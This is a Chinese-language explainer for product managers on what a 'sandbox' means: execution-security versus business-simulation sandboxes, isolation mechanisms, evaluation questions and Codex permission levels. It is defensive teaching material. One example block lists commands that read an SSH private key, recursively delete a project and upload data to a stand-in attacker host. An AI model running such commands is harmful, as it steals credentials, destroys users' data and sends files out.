# 什么是沙箱（Sandbox）

> 用途：解释“沙箱”这个技术词汇在不同场景下的含义、共同原理、隔离机制、判断标准，以及系统对接和 Vibe Coding 中的使用建议。
> 最后更新：2026-11-09
> 默认读者：有技术常识但非科班出身的产品经理。
> 前置阅读：[什么是 Runtime](08-什么是Runtime.md)、[什么是 Harness Engineering](09-什么是Harness-Engineering.md)。
> 不覆盖：具体沙箱产品的配置步骤、容器与虚拟机的完整实现、各支付平台的具体接入流程。

## 一句话结论

> **沙箱是一种“把影响关在可控范围内”的环境：你可以在这里自由试验，但失败、误操作或攻击不会波及真实系统、真实数据或真实资金。**

沙箱不是某一款软件，也不是某一种固定技术。它更像一个目标或承诺：**允许折腾，但限制后果。** 具体怎么实现，取决于它要隔离什么。

## 一、为什么叫“沙箱”

“沙箱”原指供小孩玩沙子的沙坑。孩子在沙坑里可以随便挖、随便堆，弄乱了也只是沙坑里的事，不会破坏整个院子。

这个比喻包含了三个关键点：

- **有边界**：活动范围是有限的。
- **有自由**：边界内可以随便试，不需要每一步都小心翼翼。
- **后果可控**：出了问题，影响不会扩散；最坏情况是推倒重来。

软件里的“沙箱”借用的正是这层含义，而不是某种特定的代码或产品。

## 二、沙箱不是一个东西，而是一类东西

“沙箱”在行业里没有统一的严格定义。不同场景下，它可能指完全不同的东西：

| 类型 | 隔离的对象 | 典型例子 | 主要目的 |
|---|---|---|---|
| 执行安全沙箱 | 文件、网络、进程、系统调用 | Codex、Docker、Windows Sandbox | 防止程序或 AI 误操作、被攻击 |
| 业务模拟沙箱 | 真实资金、真实用户、生产数据 | 支付平台沙箱、Salesforce Sandbox | 联调时不产生真实业务副作用 |
| 数据沙箱 | 生产数据 | 数据分析沙箱、脱敏数据环境 | 允许分析，但不泄露原始数据 |
| 浏览器/App 沙箱 | 进程、应用私有数据 | Chrome 标签页、iOS/Android 应用沙箱 | 防止应用互相访问 |
| 恶意软件分析沙箱 | 主机、内网 | 病毒分析虚拟机 | 观察恶意行为，不感染真实环境 |

它们共享同一个底层思想：**隔离 + 可控 + 可丢弃。** 但隔离的对象、真实程度和保证强度差别很大。

## 三、两类最常遇到的沙箱

日常工作中，最容易混淆的是下面两类。

### 1. 执行安全沙箱：真实系统，权限受限

这类沙箱跑的是**真实系统**，不是模拟系统。它不伪造文件，也不伪造网络，而是用操作系统机制限制程序“能碰什么”。

典型例子是 AI 编程工具。Agent 会真实执行命令，所以需要限制它的能力边界：

- 只能读写指定目录；
- 默认不能联网，或只能访问白名单；
- 不能修改系统设置；
- 不能读取用户目录里的密钥；
- 最多使用有限的 CPU、内存和运行时间。

假设 Agent 想执行三条命令：

```text
cat ~/.ssh/id_rsa
rm -rf D:\code\my-project
curl http://attacker.com/upload
```

没有沙箱时，它用的是你的账户权限，三条都可能成功：读到私钥、删掉项目、把数据传到外网。

有沙箱时，每一层都可能拦住：

| 层 | 常见机制 | 管住什么 |
|---|---|---|
| 文件 | `chroot`、`mount namespace`、只读挂载、目录白名单、Landlock、Windows ACL | 看不到或改不了范围外的文件 |
| 进程 | `PID namespace`、独立用户、受限令牌 | 看不到或杀不了宿主进程 |
| 网络 | `network namespace`、防火墙、代理白名单 | 连不出去，或只能连指定地址 |
| 系统调用 | `seccomp` | 禁止挂载、调试、重启等危险操作 |
| 资源 | `cgroups`、Windows Job Object | 限制 CPU、内存、进程数 |
| 身份 | 低权限账户、临时凭据 | 拿不到管理员权限和生产密钥 |

不同操作系统的实现不同：

- Linux 常用 namespace、cgroups、seccomp、Landlock；
- macOS 常用 Seatbelt；
- Windows 常用受限令牌、AppContainer、Job Object、Windows Sandbox。

Docker 容器也是沙箱的一种实现，但它和宿主机共用内核，隔离强度通常低于虚拟机。虚拟机有独立内核，更重，但边界更硬。

**关键点：执行安全沙箱不模拟任何东西，它只是限制真实系统的访问权限。**

### 2. 业务模拟沙箱：独立测试环境，加隔离承诺

这类沙箱常见于支付、开放平台、SaaS 系统对接。它给人的感觉是“给你一套测试参数”，但严格来说，它至少包含三层：

> **业务模拟沙箱 = 独立测试环境 + 测试身份/参数 + 隔离承诺**

三层分别是：

1. **独立测试环境**：独立部署实例，或独立租户、独立数据空间。
2. **测试身份/参数**：测试应用 ID、测试商户号、测试密钥、测试账号、测试接口地址。
3. **隔离承诺**：不碰真实资金、不写生产数据、不打扰真实用户，并且可以重置或丢弃。

这里要特别区分一种情况：

> **同一套生产服务、同一个生产数据库，只加一个 `test=true` 参数，这不是测试环境，而是“生产环境上的测试模式”。**

测试环境的最低要求是：**运行环境和数据至少有一个是独立的。** 代码可以是同一份，但生产数据不能被测试流量直接读写。更严格的做法是实例、数据库、配置、凭据全部独立。

业务沙箱里，“真”和“假”往往是混合的：

| 部分 | 可能是真的 | 可能是假的 |
|---|---|---|
| API 接口 | 真实接口、真实签名、真实回调 | 模拟响应、固定返回 |
| 资金 | 真实账户余额 | 沙箱余额、测试卡号 |
| 用户 | 真实用户体系 | 测试买家、测试租户 |
| 数据 | 真实数据结构 | 假数据、脱敏数据、副本 |
| 消息 | 真实短信、邮件、Webhook | 拦截、重定向到测试地址 |

所以不能因为叫“沙箱”就假设一定没有真实副作用。**钱可能是假的，但短信、邮件、Webhook、第三方调用仍然可能是真的。**

常见例子：

- 支付平台沙箱：测试商户号、测试买家账号、沙箱余额，接口调用是真的，但资金是假的。
- Stripe 测试模式：`sk_test_` 开头的测试密钥、测试卡号，不会真实扣款。
- Salesforce Sandbox：一套独立的组织副本，和生产数据分开。

## 四、沙箱、测试环境、预发布、Mock 的区别

这几个词经常被混用，但关注点不同：

| 概念 | 回答的问题 | 主要特点 |
|---|---|---|
| Mock | “这个依赖能不能用假的替代？” | 用假实现替代真实依赖，常用于单元测试 |
| 测试环境 | “在哪儿测？” | 独立部署或独立租户，数据和生产分开 |
| 预发布/Staging | “上线前能不能像生产一样跑一遍？” | 接近生产配置，可能连接真实依赖，但不承载真实用户 |
| 沙箱 | “在这里折腾，后果被限制住了吗？” | 强调隔离、无真实副作用、可重置；可以是安全沙箱，也可以是业务沙箱 |
| 生产环境 | “真实用户和真实数据在哪里？” | 有真实业务后果，不能随便试 |

它们不是严格的上下级关系，而是从不同角度描述环境：

- 测试环境是“地点”；
- 测试参数是“门禁卡”；
- 沙箱是“这间房炸了也不会影响整栋楼”的承诺；
- Mock 是“用道具代替真设备”；
- 预发布是“按生产标准搭的演练场”。

一个环境可以同时是测试环境和沙箱，也可以只是测试环境而不是沙箱。

## 五、沙箱靠什么保证安全

沙箱要真正起作用，不能只靠一句“请勿访问生产数据”，而要靠技术或制度强制执行。常见原则有八条：

1. **默认拒绝**：没有明确允许的，一律不行。用白名单，不用黑名单。
2. **最小权限**：只给完成任务必需的目录、网络、命令和凭据。
3. **纵深防御**：文件、网络、进程、系统调用、资源多层同时限制，不依赖单点。
4. **身份隔离**：用独立低权限账户、独立租户、独立密钥，避免“一个人出错，全公司受影响”。
5. **资源限制**：限制 CPU、内存、进程数、请求频率，防止拖垮系统。
6. **可恢复**：支持重置、快照、临时副本；假设一定会出错。
7. **可审计**：记录谁在什么时候做了什么，出问题能查。
8. **关键动作审批**：删除、推送、安装、联网、读取密钥等高风险动作，单独确认。

其中最重要的一条是：**边界必须由技术强制执行，而不是只写在文档里。**

如果所谓“沙箱”只是要求调用方自觉传 `test=true`，那它不是安全边界，只是接口约定。真正的沙箱应该在调用方不配合时，仍然能拦住越界行为。

## 六、沙箱能保证什么，不能保证什么

### 能保证的

- 降低误操作的爆炸半径；
- 防止程序访问边界外的文件、网络或系统能力；
- 允许在接近真实的环境里安全试验；
- 隔离测试资金、测试数据和真实用户；
- 限制恶意代码或不可信代码的影响范围；
- 提供可重置、可回滚的试验条件。

### 不能保证的

- **不能保证逻辑正确**：沙箱只能限制“能碰什么”，不能防止程序在允许范围内把业务逻辑写错。
- **不能保证不泄露主动放进去的密钥**：密钥在沙箱里，它就有权读。
- **不能防住所有提示注入**：如果 AI 在允许范围内被诱导做坏事，沙箱不一定能识别。
- **不是 100% 安全**：容器逃逸、内核漏洞、配置错误都真实存在。
- **不等于备份**：沙箱负责限制影响，备份负责出事之后恢复，两者不能互相替代。
- **不等于生产一致**：沙箱通过，不代表生产一定没问题；版本、配置、网络、回调、限额都可能不同。

安全工程里更准确的说法是：**沙箱降低的是概率和爆炸半径，不是把风险降为零。**

## 七、怎么判断一个“沙箱”是不是真的

不要只看名字，问五个问题：

1. **隔离对象是什么？**

   是代码执行权限，还是资金、数据、账号、网络？

2. **里面是真的还是假的？**

   是真实系统加限制，还是一套模拟副本？API 是真的还是 Mock？

3. **有没有真实副作用？**

   会不会扣款、发短信、发邮件、写生产库、调用真实第三方？

4. **能不能重置或丢弃？**

   数据能否清理？环境能否重建？搞坏了要不要人工救火？

5. **边界由谁强制执行？**

   是操作系统、平台、租户隔离，还是只靠调用方自觉？

可以用一个简单的分级表判断：

| 组合 | 更准确的说法 |
|---|---|
| 生产服务 + 测试参数 | 生产环境上的测试模式，不是测试环境 |
| 独立测试实例/租户 + 测试参数 | 测试环境 |
| 独立测试环境 + 假资金/假数据 + 无真实副作用 | 业务模拟沙箱 |
| 独立测试环境 + 技术强制隔离 + 可重置 + 可审计 | 比较完整的沙箱 |

## 八、系统对接时的最小检查清单

如果对方说“我们提供沙箱环境”，至少确认下面这些内容：

- **身份隔离**：测试应用 ID、商户号、密钥、租户是否独立？
- **数据隔离**：测试数据是否独立存储？是否会混入生产数据？
- **真实副作用**：扣款、退款、短信、邮件、Webhook、第三方调用，哪些是真的？
- **API 一致性**：接口版本、签名、错误码、回调、超时、重试是否和生产一致？
- **配额与限流**：是否有独立配额？能不能压测？超限会怎样？
- **重置能力**：数据保留多久？能否主动清理或重建？
- **密钥管理**：测试密钥权限多大？会不会过期？能否访问生产资源？
- **上线切换**：从沙箱切到生产需要改哪些配置？有没有回滚方案？
- **支持与 SLA**：沙箱出问题找谁？是否和生产享受同等支持？
- **书面承诺**：对方是否明确承诺“不会产生真实资金/数据/用户影响”？

一个实用原则：**把所有“应该不会”都当成“可能会”，逐项验证。**

## 九、Vibe Coding 中的沙箱

在 AI 编程工具里，沙箱主要解决一个问题：**Agent 会真实执行命令，不能假设它永远不出错。**

以 Codex 为例，常见的权限档位有三类：

| 档位 | 大致能力 | 适用场景 |
|---|---|---|
| 只读 | 能看代码，不能改文件 | 代码审查、方案讨论 |
| 工作区可写 | 能改当前项目，通常读得宽、写得窄 | 日常开发，推荐默认 |
| 完全访问 | 不限制目录、网络和命令 | 可信任务、临时排障 |

“读得宽、写得窄”是常见设计：Agent 需要读系统 SDK、全局配置和依赖缓存，否则编译和装包会失败；但写操作应该限制在项目目录和临时目录内。

需要特别注意：

- **“完全访问”基本等于不设 Codex 沙箱**：它仍然受 Windows/macOS/Linux 账户权限约束，但没有目录白名单、网络限制和路径隔离。
- **项目文件夹不是安全边界**：项目只是默认工作目录和界面分组；真正决定能碰什么的是沙箱策略和操作系统权限。
- **沙箱限制的是工具执行，不是模型本身**：模型在远端生成命令，本地运行时负责执行；如果 Agent 通过应用自带文件工具、MCP 服务或插件访问文件，走的是另一条通道，权限策略可能不同。
- **沙箱不能替代测试和 Git**：它防的是越界破坏，不防业务逻辑错误；仍然需要测试、代码审查和版本管理。

一个更稳的日常配置是：

```powershell
codex -s workspace-write -a on-request
```

它的含义是：只允许写工作区，遇到需要越界或高风险的动作时询问。可以用下面的命令检查当前会话权限：

```powershell
$env:CODEX_PERMISSION_PROFILE
```

如果输出 `:danger-full-access`，说明当前会话是“完全访问”，不要把它当成沙箱。

## 十、常见误区

- **“沙箱就是虚拟机”**：虚拟机只是实现沙箱的一种方式；容器、受限令牌、租户隔离也可以做沙箱。
- **“沙箱就是测试环境”**：测试环境回答“在哪儿测”，沙箱回答“后果是否被限制”。两者有重叠，但不是同义词。
- **“有测试参数就是沙箱”**：测试参数只是门禁卡；没有隔离和无副作用承诺，就只是测试环境，甚至只是生产测试模式。
- **“沙箱里一定没有真实数据”**：不一定。有些沙箱使用脱敏数据或生产副本，仍然可能包含敏感信息。
- **“沙箱是绝对安全的”**：不是。配置错误、逃逸漏洞、权限过大都会让沙箱失效。
- **“沙箱等于备份”**：沙箱限制影响，备份负责恢复；一个防出事，一个出事后的补救。
- **“沙箱通过，生产就没问题”**：沙箱和生产在版本、配置、网络、回调、限额上可能不同，必须单独做上线验证。
- **“沙箱限制了模型”**：模型本身不受本地沙箱限制；受限制的是模型调用的本地命令和工具。

## 最小掌握标准

做到下面五条，就足够在日常协作和系统对接中不被“沙箱”这个词带偏：

1. 能说出沙箱的三个核心：隔离、可控、可丢弃。
2. 能区分执行安全沙箱和业务模拟沙箱。
3. 能判断“生产测试模式”“测试环境”“业务沙箱”三者的差别。
4. 对接时能问清真实副作用：钱、消息、数据、第三方调用。
5. 知道沙箱不是绝对安全，也不是备份或测试的替代品。

下面这些可以暂缓，不影响日常判断：

- namespace、cgroups、seccomp 的具体配置；
- 容器逃逸和内核漏洞的利用细节；
- 各支付平台沙箱的完整接入流程；
- 虚拟机与容器的性能对比。

## 一句话记忆

> **安全沙箱限制“能碰什么”；业务沙箱隔离“会影响到谁”。共同点是：允许你折腾，但把后果关在门内。**
